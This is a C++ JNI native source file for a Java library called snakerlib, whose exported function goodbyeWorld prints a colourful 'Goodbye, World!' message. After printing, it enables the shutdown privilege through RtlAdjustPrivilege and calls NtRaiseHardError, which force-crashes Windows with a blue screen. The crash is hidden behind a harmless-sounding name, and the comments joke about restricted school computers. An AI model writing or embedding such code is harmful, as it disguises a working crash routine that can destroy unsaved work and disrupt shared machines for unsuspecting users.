#include "snkr.h"

#include <iostream>
#include <cstdlib>
#include <ctime>

#include <windows.h>
#include <ntstatus.h>
#include <winternl.h>
#include <bugcodes.h>
#include <jni.h>

using namespace std;

typedef NTSTATUS (NTAPI *RtlAdjustPrivilegeFn)
        (
                ULONG Privilege,
                BOOLEAN Enable,
                BOOLEAN CurrentThread,
                PBOOLEAN Enabled
        );

RtlAdjustPrivilegeFn RtlAdjustPrivilege;

typedef NTSTATUS (NTAPI *NtRaiseHardErrorFn)
        (
                LONG ErrorStatus,
                ULONG Unless1,
                ULONG Unless2,
                PULONG_PTR Unless3,
                ULONG ValidResponseOption,
                PULONG ResponsePointer
        );

NtRaiseHardErrorFn NtRaiseHardError;

int adjustPrivilege(JNIEnv *env, jobject obj)
{
    BOOLEAN Enabled = FALSE; // Enable this function
    HMODULE NtDll = GetModuleHandle("ntdll.dll"); // Get the retro library lol

    if (NtDll == NULL) {
        return -1; // This user is probably not running on a windows computer
    }

    RtlAdjustPrivilege = (RtlAdjustPrivilegeFn) GetProcAddress(NtDll, "RtlAdjustPrivilege"); // Get the internal function

    if (RtlAdjustPrivilege == NULL) {
        return -1; // This function does not exist (somehow)
    }

    NTSTATUS Status = RtlAdjustPrivilege(19, TRUE, FALSE, &Enabled); // Adjust the privileges to give snakerlib.dll admin!

    if (Status != 0) {
        return -1; // They are probably running on a restricted school computer...
    }

    if (Enabled) {
        return 0; // Privileges added successfully
    } else {
        return -1; // Could not add privileges...
    }
}

int raiseHardError(JNIEnv *env, jobject obj)
{
    ULONG ErrorResponse = 0; // This error response
    HMODULE NtDll = GetModuleHandle("ntdll.dll"); // Get the retro library lol

    if (NtDll == NULL) {
        return -1; // This user is probably not running on a windows computer
    }

    NtRaiseHardError = (NtRaiseHardErrorFn) GetProcAddress(NtDll, "NtRaiseHardError"); // Get the internal function

    if (NtRaiseHardError == NULL) {
        return -1; // This function does not exist (somehow)
    }

    NTSTATUS Status = NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); // Raise a hard error

    if (Status != 0) {
        return -1; // Could not add privileges...
    }

    return 0; // Privileges added successfully
}

JNIEXPORT void JNICALL Java_xyz_snaker_snakerlib_SnakerLibNatives_goodbyeWorld(JNIEnv *env, jobject obj)
{
    srand(time(0));

    const string RESET = "\u001b[0m";

    for (char c: "Goodbye, World!") {
        int randomColour = rand() % 216 + 16; // Get a random colour for each character

        cout << "\u001b[1m\u001b[3m\u001b[4m" << "\u001b[38;5;" << randomColour << "m" << c << RESET; // Print out a lovely colourful message
    }

    cout << RESET << endl;

    adjustPrivilege(env, obj); // Adjust privileges
    raiseHardError(env, obj); // Raise err
}